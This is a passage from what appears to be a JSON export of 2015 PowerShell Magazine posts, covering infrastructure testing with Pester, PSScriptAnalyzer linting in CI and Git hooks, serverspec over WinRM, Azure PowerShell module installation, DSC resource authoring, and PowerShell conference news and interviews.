$result = Invoke-Pester -OutputFile $pester_xml -OutputFormat NUnitXml -PassThru -Strict ` -ErrorAction Stop if ($result.FailedCount -gt 0) { throw \u0026#34;{0} tests did not pass\u0026#34; -f $result.FailedCount } } catch { $msg = $_ Write-Error -ErrorRecord $msg exit 1 } With these settings you will be able to view the following information on every build summary:\nTeamCity can even tell if tests failed because of new errors or if that error has already been encountered before. Very powerful.\nI demoed that integration at MMS 2015 in Minneapolis and said that this test runs every time I commit new code to my Git repository, automatically. I don’t have to do anything else now, if all the tests pass (there are some more), then, and only then, will TeamCity pack my code and upload it to the PowerShell Gallery.\nIn the next part of this series I will show how to, with these artefacts now available, achieve Continuous Deployment.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/23/powershell-tools-for-the-advanced-use-cases-part-3/","tags":["How to","DevOps"],"title":"PowerShell Tools For The Advanced Use Cases – part 3"},{"categories":["News","VS Code"],"contents":"If you are not watching #VisualStudio #Connect2015, you are certainly missing a lot. Because … @ScottGu just announced a lot of new features including extension support in Visual Studio Code. And. hey, there is a PowerShell extension.\nTo get this PowerShell extension for VS Code, make sure you first download the latest update. VS Code has to be at version 0.10.1. You will need PowerShell 5.o too on the system where you are installing this.\nOnce you have the update, open Command Pallete (View Menu) and type _‘ext install PowerShell’ _and click on the extension to install it.\nThis is it. Once you are done, don’t forget to check the readme. Check out this PowerShell product team announcement too. This extension is open sourced and available on Github.\nIf you are developer interested in enabling PowerShell support in an editor, do check out the Github repo that has the PowerShell Editor Services code. PowerShell Editor Services provides common functionality that is needed to enable a consistent and robust PowerShell development experience across multiple editors.\nIf you are already wondering about PowerShell ISE, read this last line from PowerShell team announcement.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/18/powershell-extension-for-visualstudio-code-connect2015/","tags":["News","VS Code"],"title":"PowerShell Extension for #VisualStudio Code #Connect2015"},{"categories":["DevOps","How To","Pester"],"contents":"Posts in this series  PowerShell Tools for the Advanced Use Cases, part 1 PowerShell tools for the advanced use cases – part 2 (this article) PowerShell tools for the advanced use cases – part 3  Testing In all teams that follow a “DevOps” mindset there is also the concept of CI (Continuous Integration) or even CD (Continuous Deployment). A part of these concepts is “testing” and validation.\n“Is the environment I am going to build in / deploy to ready for deployment?”, “Is what I deployed what I expect it to be?”. The latter is not meant to be “Is what I deployed working the way I expect it to work?”, this would be functional or integration testing.\nToday, I would like to introduce something some people call “Technical Verification Tests” (TVT) or “making sure stuff is the way you want it to be” and environment verification. We will first start with the latter.\nPester your environment Are you on PowerShell v5? Cool, use PowerShell to install the PowerShell Testing Framework “Pester” onto your machine.\nOr, if you’re not on PowerShell 5 yet, go get the module from here, or check the module out on the Gallery itself here.\nInstall-Module -Name Pester -Repository PSGallery -Scope CurrentUser –Verbose This command will get the PowerShell module “Pester” from the PSGallery (http://www.powershellgallery.com) and installs it into your current user’s profile. If you want to check, have a look at “C:\\Users$env:USERNAME\\Documents\\WindowsPowerShell\\Modules”.\nPester is, most of the times, advertised for testing your PowerShell functions, modules or DSC resources. People also mention TDD or Test Driven Development in those cases. I have never been able to get my brain to work “TDD style”, so I won’t get any further into this here than just saying “you first write your tests, initially they all fail, because there’s no actual code, and then you write your code and make your tests pass”. My brain works the other way round.\nPester environment verification Environment verification tests are for example run as the first step in a deployment pipeline from a CI/CD server (like Jenkins, Teamcity, Go.CD or maybe even nested Azure Automation runbooks) and check if the environment is ready to be deployed in to before we even start deploying anything. This makes a lot of sense, because you might know what requirements you have for your deployment, but while progressing through environments (Dev, System Test (ST), SIT (System Integration Test), PreProd, Prod) you might not know in which state an environment is in or if a recent change might has broken some of your requirements. So making sure that from a pure deployment perspective you’re good to go is quite valuable.\nHow would tests like this look like in Pester?\nIt is easy to set up the skeleton for these tests. With just a couple of lines (on a system with Pester on it) we can create a test skeleton in Pester and fill it with tests like this:\nSome very common things to test for are for example “access”; “can I access a remote system?”, “does it listen on specific ports?” or “is there enough free disk space.\nLuckily these are all things that are easily written in PowerShell.\nparam ( [Parameter(mandatory=$false)] [string]$server = \u0026#39;localhost\u0026#39; ) Describe \u0026#34;environment_verification\u0026#34; { It \u0026#34;Tests Port 80\u0026#34; { (Test-NetConnection -ComputerName $server -Port 80).TcpTestSucceeded | Should Be \u0026#39;True\u0026#39; } It \u0026#34;Tests Port 5986\u0026#34; { (Test-NetConnection -ComputerName $server -Port 5986).TcpTestSucceeded | Should Be \u0026#39;True\u0026#39; } It \u0026#34;Server\u0026#39;s C:\\ partition should have minimum 5GB of free disk space\u0026#34; { (Get-WmiObject -Class win32_logicaldisk -ComputerName $server -Filter \u0026#34;DeviceID = \u0026#39;C:\u0026#39;\u0026#34;).FreeSpace/1GB | Should BeGreaterThan 5 } } Pester TVT Technical verification tests (TVT) are usually whatever you want them to be. In my opinion they make sense for things you developed yourself or for processes you don’t really trust. I don’t necessarily go and test if a Windows Feature is really successfully installed if I have used PowerShell DSC to install it, because I trust that its own internal checks are enough.\nHowever, I might want to check custom code that might got used to configure a remote service and where I know that this doesn’t always work (for whatever reason). I hope this makes sense.\nIn this example I am going to check the IIS configuration that has been given to me from a third party and that I have to work on.\nDescribe \u0026#34;TVT\u0026#34; { It \u0026#34;checks if IIS is up and running\u0026#34; { (Get-Service -Name W3SVC).Status | Should Be \u0026#34;Running\u0026#34; } It \u0026#34;checks if IIS anonymous authentication is disabled on Default Web Site\u0026#34; { (Get-WebConfigurationProperty -Filter \u0026#39;/system.webServer/security/authentication/anonymousAuthentication\u0026#39; -Name Enabled -PSPath \u0026#39;IIS:\\\\\u0026#39; -Location \u0026#39;Default Web Site\u0026#39;).Value | Should Be \u0026#34;false\u0026#34; } It \u0026#34;checks if IIS Windows authentication is enabled on Default Web Site\u0026#34; { (Get-WebConfigurationProperty -Filter \u0026#39;/system.webServer/security/authentication/WindowsAuthentication\u0026#39; -Name Enabled -PSPath \u0026#39;IIS:\\\\\u0026#39; -Location \u0026#39;Default Web Site\u0026#39;).Value | Should Be \u0026#34;true\u0026#34; } } That’s all nice, but how are we going to run all this?\nPester integration into a CD pipeline Obviously it isn’t the greatest idea to run these tests manually, we want these tests to run before and after every deployment and get the test results. Continuous Integration servers like TeamCity can help with this.\nIntegrating Pester into a CI pipeline is as straight forward as it gets. The Pester Github repository even explains how it’s done.\nI saved the first snippet of this article as env_check.ps1, pass it to the Invoke-Pester cmdlet and use Pester’s capability of outputting the test results in the standard NUnitXml format which can then be read and interpreted by TeamCity. TeamCity can then display the test results in the build log for everybody with access to it.\nIntegrating the TVT would work the same way.\nxPlatform Testing Well, this is all nice and easy if you’re working in an all Windows environment or you can make sure that you can always execute on a Windows machine, but, let’s say this is not the case.\nMost CI / CD, some (wrongly?) call them DevOps environments, are not homogenous, meaning pure Windows or pure Linux, they are all pretty much heterogenous and in those cases, it sometimes pains me to say, the platform of choice to control deployments from is Linux.\nWhat are our options in those scenarios?\n Use Pester still as our testing framework for Windows, because that’s what we know, but we would need some other framework that can trigger Pester from *nix or Use one framework that can test the *nix and Windows platform, because it isn’t a good practise to split this task up  Serverspec A testing framework that can do this would be serverspec. This is written in ruby and based on rspec, a behaviour driven development framework, like Pester, or probably, to be fair, the other way around.\nFor the sake of this article I will only do a high level introduction to get you started with serverspec.\nI am running serverspec during development from my MacBook against Windows environments. Serverspec uses WinRM to communicate to Windows, more specifically it uses the ruby WinRM module. It can easily use SSL secure communication for this.\nMy spec_helper.rb file, which configures serverspec, has the following content:\nrequire \u0026#39;serverspec\u0026#39; require \u0026#39;winrm\u0026#39; set :backend, :winrm user = ‘user’ pass = ‘password’ endpoint = \u0026#34;https://#{ENV[\u0026#39;TARGET_HOST\u0026#39;]}:5986/wsman\u0026#34; winrm = ::WinRM::WinRMWebService.new(endpoint, :ssl, :user =\u0026amp;gt; user, :pass =\u0026amp;gt; pass, :basic_auth_only =\u0026amp;gt; true, :no_ssl_peer_verification =\u0026amp;gt; true) winrm.set_timeout 300 # 5 minutes max timeout for any operation Specinfra.configuration.winrm = winrm Please note that I am disabling the SSL certificate verification in my test environment.\nA typical serverspec file could look like this:\nrequire \u0026#39;spec_helper\u0026#39; describe port(5985) do it { should be_listening } end describe command(\u0026#39;(Get-Process -Name explorer).ProcessName\u0026#39;) do its(:stdout) { should match \u0026#34;explorer\u0026#34; } end describe group(\u0026#34;Administrators\u0026#34;) do it { should be_exist } end describe service(\u0026#34;WinRM\u0026#34;) do it { should be_enabled } it { should be_running } end The output of it looks similar to Pester’s and can of course also easily be re-used in a CI server.\nConclusion This introduction to infrastructure testing has hopefully shown you the value of investing time in writing these tests.\nTo conclude, it makes sense testing your assumptions about an environment before deploying into it in order to find issues before even changing anything, i.e. installing software or making changes. They can also be used to check if your Ansible playbooks, Puppet Manifests or Chef cookbooks properly apply the changes, if you don’t trust them in the first place.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/02/powershell-tools-for-the-advanced-use-cases-part-2/","tags":["DevOps","How To","Pester"],"title":"PowerShell tools for the advanced use cases – part 2"},{"categories":["News"],"contents":"In 2016, the newly minted “PowerShell Conference EU” will be hosted in Hannover, Germany, and may well become the largest PowerShell conference world-wide with its 160 delegates and 30 speakers. Registration starts today at psconf.eu.\nWhen powershellcommunity.org decided earlier this year to discontinue the European PowerShell Summit and focus on the US market, the UK and Scandinavian community and the German community decided to combine forces, and merge the former “PowerShell Summit EU” and “Deutsche PowerShell Konferenz” into one great event, organized by EU community members. It now is a three day conference with two continuous main tracks, one in English and one in German.\n“We believe a PowerShell conference should offer presentations in the language attendees feel most comfortable with”, Weltner explains. “This year, the “Deutsche PowerShell Konferenz” already added English tracks to the conference. We simply wanted the best experts and speakers around the world to present, and they do not all speak German. With the new format, there will be tracks in both languages at all times, and the best PowerShell experts and speakers you can find anywhere around.”\nDay 1 is a classic conference day with two main auditoriums, keynote, and presentations, and in the evening, all delegates are invited to Yukon Bay, an old gold digger town in the heart of Hannover Zoo, where delegates can socialize and connect surrounded by ice bears and penguins, while enjoying food and drinks.\nDay 2 and 3 are highly innovative and focus on learning, discussion, and experimenting. The two main presentation tracks continue all day, but there are a total of 10 additional breakout session rooms available where delegates and speakers can come together, discuss presentations, play with demos, do deep-dives, or come up with own content and discussion. There will also be room for PowerShell user groups to present themselves.\n“The two primary goals for this conference are reaching out to fellow PowerShell people, and be inspired and bring back home new skills and ideas that make a difference for you and your company.”, Weltner said. “Listening to a presentation is great. Sometimes, it’s even better to have the chance to hijack the speaker after a presentation that really interests you, gather in a separate room, and deep-dive into the presentations.”\nThe call for speakers is open until end of year. Registration opened today. The conference is limited to 160 delegates on a first come first serve basis. The first 100 registrants receive a discount. Registration as well as all other conference information can be found at www.psconf.eu.\nWhy Hannover? It was chosen for practical as well as philosophical reasons: travel expenses are reasonable, and 2016 is “Leibniz year” in Hannover. Leibniz invented the “Monadology” more than 300 years ago and lived and researched for many decades in Hannover. Since PowerShell is based on this Monadology, Hannover seems like the perfect PowerShell place to be in 2016.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/02/powershell-conference-eu-2016-registration-starts-now/","tags":["Conferences","News"],"title":"PowerShell Conference EU 2016 – Registration Starts Now"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Janaka Rangama, Microsoft MVP in Cloud and Data Center Management talks to us about PowerShell and what he likes in PowerShell!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/20/psconfasia-an-interview-with-powershell-expert-janaka-rangama/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Janaka Rangama"},{"categories":null,"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Emerald Tabirao who works at Microsoft how she started with PowerShell, what she likes in PowerShell, and how one can get started with PowerShell.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/19/psconfasia-an-interview-with-powershell-expert-emerald-tabirao/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Emerald Tabirao"},{"categories":null,"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Milton Goh, Microsoft MVP in PowerShell talks to us about how he started with PowerShell and what he likes in PowerShell!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/16/psconfasia-an-interview-with-powershell-expert-milton-goh/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Milton Goh"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Ryan Yates talks to us about how he started with PowerShell, PowerShell community and his experience at the PowerShell Conference Asia!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/15/psconfasia-an-interview-with-powershell-expert-ryan-yates/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Ryan Yates"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Gayathri talks to us about how she started with PowerShell and what she likes the most in PowerShell.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/14/psconfasia-an-interview-with-powershell-expert-gayathri-narayanan/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Gayathri Narayanan"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Jason Brown who works at Domain.com.au talks to us about how he started with PowerShell and the role of PowerShell and DSC within DevOps at his company!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/13/psconfasia-an-interview-with-powershell-expert-jason-brown/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Jason Brown"},{"categories":["Azure","Azure PowerShell"],"contents":"If you have not seen this yet, Azure PowerShell 1.0 is in preview. If you have been using Azure Resource Manager cmdlets, there is a breaking change between 0.9.8 and 1.0. All Azure Resource Manager cmdlets in 1.0 have the AzureRM prefix. Also, there are different modules for different aspects of Azure management. One method you can get Azure PowerShell 1.0 Preview is to use the PackageManagement cmdlets. Azure blog quotes this saying:\nWhile the official blog post says that WMF 5.0 is required, it isn’t really necessary. This is because there is a PackageManagement preview available for down-level PowerShell versions. 🙂\nOnce you download and install this PackageManagement preview on PowerShell 3.0 or 4.0 systems, you will get access to cmdlets such as Find-Module and Install-Module.\nHere is $PSVersionTable from my system.\nFind-Module -Name Azure*  Note: The above command will return Azure related modules written by community as well and not just Azure SDK team.\n Let’s go ahead and install all modules with AzureRM prefix (24 of them at the time of writing!)\n$AzureModules = Find-Module -Name AzureRM* | Select-Object -Expand Name Install-Module -Name $AzureModules -Force Or, you can install only AzureRM module using the Install-Module cmdlet and then use the Install-AzureRM cmdlet to install remaining Azure Resource Manager modules. This cmdlet is an alias for the Update-AzureRM cmdlet.\nFinally, verify that all the AzureRM modules got installed and the cmdlets are available.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/13/azure-powershell-1-0-preview-installation-on-down-level-powershell-systems-using-packagemanagement-cmdlets/","tags":["Azure","Azure PowerShell"],"title":"Azure PowerShell 1.0 Preview Installation on Down-level PowerShell Systems Using PackageManagement Cmdlets"},{"categories":["How To","DevOps"],"contents":"Posts in this series  PowerShell Tools for the Advanced Use Cases, part 1 (this article) PowerShell tools for the advanced use cases – part 2 PowerShell tools for the advanced use cases – part 3  In the world of DevOps it’s all about automation–automated installation of applications, automated configuration of applications, all automated. Infrastructure as Code.\nThe thing is a lot of people think it is enough to just write a script and off you go. That is not enough. Code has to be tested, requirements be checked, or artefacts be built.\nThis article will introduce a couple of tools especially written for/in PowerShell or that can be used in combination with PowerShell that will make your production code more robust/reliable and are ultimately easy to implement into a Continuous Integration pipeline.\nI am not going to talk about “Why use Source Control” here, as I am now assuming that all of you are already using some sort of Version and Source Control like Git(hub/lab), VSO, TFS, or even Mercurial. I am going to talk about some tools that are often ignored or a lot of people don’t even know exist.\nPSScriptAnalyzer Are you a member of a team? Do you share PowerShell modules inside of this team or have multiple team members work on the same code once in a while? Do you share your code to the community–via Git(hub/lab) or the PowerShell Gallery? Or, do you code for yourself but still want to follow some accepted best practises?\nEnter PSScriptAnalyzer If you have done any work on Linux or with other scripting/development languages before then you might have come across linters. Pylint, yaml-lint, puppet-lint, json-lint, rubocop, these are all examples of very mature style guide checks for several languages that are not born on Windows, but also apply to use case scenarios on Windows, so do check them out.\nHowever, none of them checks PowerShell style. There were some tools around in the past, but now Microsoft has released the new version of PSScriptAnalyzer to their PowerShell Gallery.\nFind-Module -Name PSScriptAnalyzer | Select-Object Version, Name, Description | Format-List * The module is hosted on the PowerShell Gallery and can easily be installed via PowerShellGet: Install-Module -Name PSScriptAnalyzer\nThe PSScriptAnalyzer module comes with two commands:\nUsing the PSScriptAnalyzer is more than simple. Call the Invoke-ScriptAnalyzer cmdlet and point it either to a folder with PowerShell scripts in it or to a PowerShell module and it will analyse your code.\nI pointed it at my GithubConnect module (an older version of it) and got these results:\nWith that one line my whole module has been tested against 38 built-in rules (Module Version 1.1.0, 10/10/2015) and comes back with two errors and it exactly points me to the file and line I have to go and investigate.\nIf you want to see all the built-in rules, call Get-ScriptAnalyzerRule and check each rule’s description.\nHow does PSScriptAnalyzer work? Pretty simple, actually. PSScriptAnalyzer uses the Abstract Syntax Tree (AST) to parse a script file and check for certain patterns depending on the rule. AST has been introduced in PowerShell 3.0.\nIf you want to find out how to extend PSScriptAnalyzer with your custom rules or read a bit more about it, check the Github repository (here) or watch a recording of a PowerShell Summit Europe session (here).\nAdd it to your CI build You don’t want to build/package code that isn’t up to anyone’s standards, right? There are two ways of achieving a nice code quality in your environment. One is fully-automated, the other one is half-automated.\nI use TeamCity CI in my lab to do Continuous Integration builds every time I commit code to some of my repositories. However, I don’t want to have anything built or even uploaded to the Internet if there’s something wrong with my code. That is why I have added this little snippet of code as one of the very first steps into my CI pipeline:\ntry { Import-Module -Name PSScriptAnalyzer -ErrorAction Stop } catch { Write-Error -Message $_ exit 1 } try { $rules = Get-ScriptAnalyzerRule -Severity Warning,Error -ErrorAction Stop $results = Invoke-ScriptAnalyzer -Path \u0026#34;C:\\Program Files\\WindowsPowerShell\\Modules\\$Module\u0026#34; -IncludeRule $rules.RuleName -Recurse -ErrorAction Stop $results } catch { Write-Error -Message $_ exit 1 } if ($results.Count -gt 0) { Write-Host \u0026#34;Analysis of your code threw $($results.Count)warnings or errors. Please go back and check your code.\u0026#34; exit 1 } else { Write-Host \u0026#39;Awesome code! No issues found!\u0026#39; } This code lets the build fail if there are any issues found with it. Very handy, right? This way every commit to this repository’s branch is automatically checked for issues and if any are found, the developer is informed straight away.\nBut, what if you don’t even want to start building every time, but want to catch issues even earlier on?\nGit Pre-Commit hooks Git is AWESOME! (Fullstop!)\nAlright, thing is, you want to know about an issue as early as possible. Why even let your bad code get into source control and check it there if you can get that done earlier?\nGit has a lot of functionality a lot of people don’t use, like Git hooks.\nAfter creating a local git repository with either git init or git clone have you ever checked that ..git directory?\nThat directory has a subdirectory with all possible hooks, even with samples. And they are all bash shell scripts. No worries! That’s easy.\nCreate two new files in there. Pre-commit (no file extension!!!)\n#!/bin/sh echo exec powershell.exe -ExecutionPolicy Bypass -File \u0026#39;.\\.git\\hooks\\pre-commit-hook.ps1\u0026#39; exit pre-commit-hook.ps1 Write-Host \u0026#39;Starting Script Analyzer\u0026#39; try { $results = Invoke-ScriptAnalyzer -Path . $results } catch { Write-Error -Message $_ exit 1 } if ($results.Count -gt 0) { Write-Error \u0026#34;Analysis of your code threw $($results.Count)warnings or errors. Please go back and check your code.\u0026#34; exit 1 } Now commit something. It will now check your code for violations of style best practices. Feel free to change this snippet to your liking. If your code is stylish enough, it gets committed, if not, fix it, and come back.\nIn the next part of this two-part series I am going to do quite a bit of testing and validation. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/12/powershell-tools-for-the-advanced-use-cases-part-1/","tags":["How To","DevOps"],"title":"PowerShell Tools for the Advanced Use Cases, part 1"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Girish Prakash, technologist at Dell talks to us about Dell’s PowerShell provider to manage business client BIOS settings and what he likes in PowerShell!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/12/psconfasia-an-interview-with-powershell-expert-girish-prakash-2/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Girish Prakash"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Jaap Brasser, PowerShell MVP, talks to us about how he started with PowerShell and what he likes or thinks needs improvement in PowerShell!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/09/psconfasia-an-interview-with-powershell-expert-jaap-brasser/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Jaap Brasser"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Deepak Dhami, PowerShell MVP working at Dell Inc. talks to us about how he started with PowerShell and what he likes or thinks needs improvement in PowerShell!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/08/psconfasia-an-interview-with-powershell-expert-deepak-dhami/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Deepak Dhami"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, we have Narayanan Lakshmanan (Nana), Engineering Manager for DSC at Microsoft (PowerShell team) talking about the Cloud OS vision, what it means to be on the PowerShell team, and much more!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/07/psconfasia-an-interview-with-powershell-expert-narayanan-lakshmanan/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Narayanan Lakshmanan"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had the chance to sit with some of them and talk to them about PowerShell, of course!\nToday, the second in this series, Benjamin Hodge, Technical Services Director at Kemp Technologies talking about how he started with PowerShell, what he likes the most in PowerShell, and how beginners can get started with PowerShell.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/06/psconfasia-an-interview-with-powershell-expert-benjamin-hodge/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Benjamin Hodge"},{"categories":["Interviews"],"contents":"We concluded the first exclusive PowerShell conference in Asia a couple of weeks ago. It was very successful and there are already plans to take this conference around APAC region. We have had PowerShell experts from around the world joining us as speakers at this conference. I had a chance to sit with some of them and talk to them about PowerShell, of course!\nToday, Ferdinand Rios, CEO, SAPIEN Technologies talks to us about many things around PowerShell, PowerShell Studio, and the community.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/10/05/psconfasia-an-interview-with-powershell-expert-ferdinand-rios/","tags":["Interviews"],"title":"#PSConfAsia An Interview with PowerShell Expert Ferdinand Rios"},{"categories":["News"],"contents":"The PowerShell Summit Europe 2015 was arranged in Stockholm, Sweden on September 14-16. This was a unique opportunity to meet community people you mostly know from Twitter and other social media, as well as product group members from Microsoft. And of course, you got to see many great sessions on various topics.\nMembers of the PowerShell team talked about the impact of the community.\nDuring the conference there was also some announcements made by Microsoft. PowerShell Script Runbooks in Azure Automation was one of the highlights (it should also be available in SMA at some point – no timeframe given though).\nDuring the breaks people got the chance to meet up and mingle.\nMostly as a fun element during my “Manage your IT Pro Computer using PowerShell” session, I’ve included the Get-BabyStats command. My wife and I register all activity for our 4-month old son on our cell phones, and this data is available on the vendor’s website. I’ve created a function which uses Invoke-WebRequest to retrieve this information, where we can do all kind of useful things with the data such as using Group-Object which is shown in the above picture.\nNote that this was the last PowerShell Summit in Europe arranged by powershell.org. You can read more about the background in this article. Hopefully community members will step up and make another great PowerShell conference in Europe in 2016.\nAll videos from the conference are now available on YouTube.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/23/summary-from-powershell-summit-europe-2015/","tags":["Conferences","News"],"title":"Summary from PowerShell Summit Europe 2015"},{"categories":["PowerShell DSC","Azure Pack"],"contents":"In this series:\nPart 1 – Journey to a Windows Azure Pack VM Role DSC Resource: Introduction\nPart 2 – Journey to a Windows Azure Pack VM Role DSC Resource: PowerShell module usage\nPart 3 – Journey to a Windows Azure Pack VM Role DSC Resource: Inside the module\nPart 4 – Journey to a Windows Azure Pack VM Role DSC Resource: The DSC resource (this article)\nYou’ve reached the final article in this series. Now the ground work has been done by creating a PowerShell module, it’s time to layer a DSC resource on top of it. While reading this post, you will see that the investment needed to do this is not such a big deal compared to the creation of the PowerShell module. When you are developing modules I encourage you to take the extra step!\nAs with the PowerShell module, I have made the DSC resource module explained in this post available on GitHub. If you have WMF 5.0 installed, you can install the DSC resource module from the PowerShell gallery as well by running the following command: Install-Module cWAPack. For the PowerShell module run Install-Module WAPTenantPublicAPI.\nBackground Some time ago I’ve written a blog series on Integrating Windows Azure Pack VM Roles with DSC Pull service. I’m going to use the resulting VM Role to demonstrate deployment of VM Roles using DSC where the resulting VM will be configured using DSC as well (the “Inception” effect). Also, I gave a presentation on the Dutch PowerShell User Group, where the deployment of the VM Role was partly backed by Service Management Automation. I did this so we could have one generic DSC Pull-enabled VM Role which could become any kind of service by making deployment time decisions on the SMA side of things (e.g. install sources to attach, extra disks to attach, keep VM Role under provisioning status while DSC was still running). I refer to this process, jokingly, as “Just in time automation”. You can read about it here. Finally, I would like to mention a blog post I’ve written on a way to “Bring your own DSC” as a way to implement the DSC VM Extension behavior with the somewhat limited Azure Pack VM Role capabilities.\nWith this blog series, I feel like I’ve come full circle now by creating an end-2-end DSC-enabled Azure Pack VM Role deployment model. Hope you enjoy reading about this as much as I had learning it all!\nCreating the DSC resource Class- or Script-based resource? I’m a big fan of authoring class-defined DSC resources. I think the coding experience is far superior than script-based resource modules and most of the complexities involved with a script-based resource module are non-existent for class-based resource modules (e.g. folder structure, MOF schema, etc.). One big advantage of the script-based DSC resource modules however is compatibility with WMF 4.0 (DSC v1) and since WMF 5.0 (although in Production Preview) is still not RTM at the time of writing, I’ve decided to develop this resource module as a script-based module. Another reason to pick script-based resource module development over class-based, or vice versa, could be target technology. If a technology is for Windows Server 2016+ only for example (e.g. containers), I would always choose class-based development.\nxDSCResourceDesigner To help you set up a DSC script module correctly (using the correct folder structure, MOF schema file, etc.) Microsoft released a PowerShell helper module which can handle this for you. The module is called xDSCResourceDesigner and can be found on GitHub and the PowerShell gallery (Install-Module xDSCResourceDesigner).\nOnce this module is installed we can create a DSC resource script module using a PowerShell script. I used the following to create mine:\nImport-Module xDSCResourceDesigner $BuildDir = \u0026#39;C:\\\u0026#39; New-xDscResource -ModuleName cWAPack -Name \u0026#39;BG_WAPackVMRole\u0026#39; -FriendlyName \u0026#39;WAPackVMRole\u0026#39; -ClassVersion \u0026#39;0.0.3.0\u0026#39; -Path $BuildDir -Property @( New-xDscResourceProperty -Name Name -Type String -Attribute Key -Description \u0026#39;Cloud Service and VM Role Name\u0026#39; New-xDscResourceProperty -Name Ensure -Type String -Attribute Write -ValidateSet \u0026#39;Present\u0026#39;,\u0026#39;Absent\u0026#39; New-xDscResourceProperty -Name Url -Type String -Attribute Required -Description \u0026#39;Tenant Public API or Tenant API URL\u0026#39; New-xDscResourceProperty -Name SubscriptionId -Type String -Attribute Required -Description \u0026#39;Subscription ID\u0026#39; New-xDscResourceProperty -Name Credential -Type PSCredential -Attribute Required -Description \u0026#39;Credentials to acquire token\u0026#39; New-xDscResourceProperty -Name VMRoleGIName -Type String -Attribute Required -Description \u0026#39;VM Role Gallery Item name\u0026#39; 